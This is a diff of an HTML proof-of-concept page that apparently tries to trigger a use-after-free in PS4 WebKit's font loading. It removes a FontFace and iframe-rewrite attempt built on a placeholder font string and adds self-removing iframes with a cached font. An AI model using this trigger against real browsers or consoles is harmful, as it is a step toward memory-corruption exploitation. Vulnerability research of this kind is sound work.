@@ -1,49 +1,16 @@
-<!DOCTYPE html>
-<html>
 <head>
-  <style>
-    @font-face {
-      font-family: 'TestFont';
-      src: url('data:font/ttf;base64,AAEAAAA...'); /* minimal valid TTF base64 */
-    }
-    body {
-      font-family: 'TestFont';
-    }
-  </style>
-  <script>
-    // Minimal valid TTF font (base64-encoded, truncated for brevity)
-    const minimalTTF = 'AAEAAAAOAIAAAwBgRkZUTWvUtZwAAADMAAAAHkdURVQcGSKMAAAAzAAAACBPUy8yTxlJhAAAAUgAAABWY21hcAD2APoAAAJYAAAAamdhc3D//wADAAACMAAAAARnbHlm31OaZQAAAiAAAAHkaGVhZP/4RdIAAAJIAAAANmhoZWQBqAHoAAACcAAAACRobXR4KgAAAAAABCAAAACcbWF4cA+YBgAAAAwgAAACIG5hbWV6LNgAAAABfAAAAnhwb3N0AAAAAAAFAAAAACRwcmVwUu1ZUAAAAFQAAAAgAAEAAwAAAAAAAAAAAAAAAAAAAAEAAgAAAAAAAAAAAAAAAAAAAAAACgAFAAAAAAAAAAIAAAAAAAAACgAFAAAAAAAAAAIAAAAAAAAACAACAAIAAQAgACAAIAAgAFAAAAAAAFAAAAAAABIAAQAAAAEAAKj51WUBLAGQAAUAAAKZAnoAAABMApkCmgAAAIACmQKaAAEA+AAdAZAAAABAAcgCkAAAAEAAcAKQAAAAQABwA5AAAAFAAHACkAAAAEAAcAKQAAAAQABwA5AAAAFAAHACkAAAAEAAcAKQAAAAQABwA5AAAAFAAHACkAAAAEAAcAKQAAAAQABwA5AAAAFAAHACkAAAAEAAcAKQAAAAQABwA5AAAAFAAHACkAAAAEAAcAKQAAAAQABwA5AAAAFAAHACkAAAAEAAcAKQAAAAQABwA5AAAAFAAHACkAAAAEAAcAKQAAAAQABwA5AAAAFAAHACkAAAAEAAcAKQAAAAQABwA5AAAAFAAHACkAAAAEAAcAKQAAAAQABwA5AAAAFAAHACkAAAAEAAcAKQAAAAQABwA5AAAAFAAHACkAAAAEAAcAKQAAAAQABwA5AAAAFAAHACkAAAAEAAcAKQAAAAQABwA5AAAAFAAHACkAAAAEAAcAKQAAAAQABwA5AAAAFAAHACkAAAAEAAcAKQAAAAQABwA5AAAAFAAHACkAAAAEAAcAKQAAAAQABwA5AAAAFAAHACkAAAAEAAcAKQAAAAQABwA5AAAAFAAHACkAAAAEAAcAKQAAAAQABwA5AAAAFAAHACkAAAAEAAcAKQAAAAQABwA5AAAAFAAHACkAAAAEAAcAKQAAAAQABwA5AAAAFAAHACkAAAAEAAcAKQAAAAQABwA5AAAAFAAHACkAAAAEAAcAKQAAAAQABwA5AAAAFAAHACkAAAAEAAcAKQAAAAQABwA5AAAAFAAHACkAAAAEAAcAKQAAAAQABwA5AAAAFAAHACkAAAAEAAcAKQAAAAQABwA5AAAAFAAHACkAAAAEAAcAKQAAAAQABwA5AAAAFAAHACkAAAAEAAcAKQAAAAQABwA5AAAAFAAHACkAAAAEAAcAKQAAAAQABwA5AAAAFAAHACkAAAAEAAcAKQAAAAQABwA5AAAAFAAHACkAAAAEAAcAKQAAAAQABwA5AAAAFAAHACkAAAAEAAcAKQAAAAQAB......'; // Replace with valid minimal TTF
-
-    let font = new FontFace('TestFont', `url(data:font/ttf;base64,${minimalTTF})`);
-    document.fonts.add(font);
-
-    // Start loading font
-    font.load();
-
-    // Immediately set up an event that may trigger during loadDone
-    window.addEventListener('load', () => {
-      // Try to force document destruction during loadDone
-      // This is where we try to trigger the UaF
-      const iframe = document.createElement('iframe');
-      document.body.appendChild(iframe);
-      iframe.contentDocument.open();
-      iframe.contentDocument.write('<h1>Replacing document</h1>');
-      iframe.contentDocument.close(); // May trigger cleanup
-
-      // Force GC or layout to trigger font timer
-      setTimeout(() => {
-        // This may cause fontLoadingTimerFired to run after Document is freed
-        console.log("Attempting to trigger UaF...");
-      }, 0);
-    });
-
-    // Optional: force layout to trigger font loading
-    setTimeout(() => {
-      getComputedStyle(document.body).fontFamily;
-    }, 100);
-  </script>
+<style>
+/* cache the font */
+@font-face {
+  font-family: 'uaf';
+  src: url(a.ttf);
+}
+body { 
+  font-family: 'uaf';
+}
+</style>
 </head>
 <body>
-  <h1>Testing PS4 WebKit UaF - Issue 374377963</h1>
+  <iframe id="a" onload="document.getElementById('a').remove();" src="child.html"></iframe>
+  <iframe id="b" onload="document.getElementById('b').remove();" src="child.html"></iframe>
 </body>
-</html>
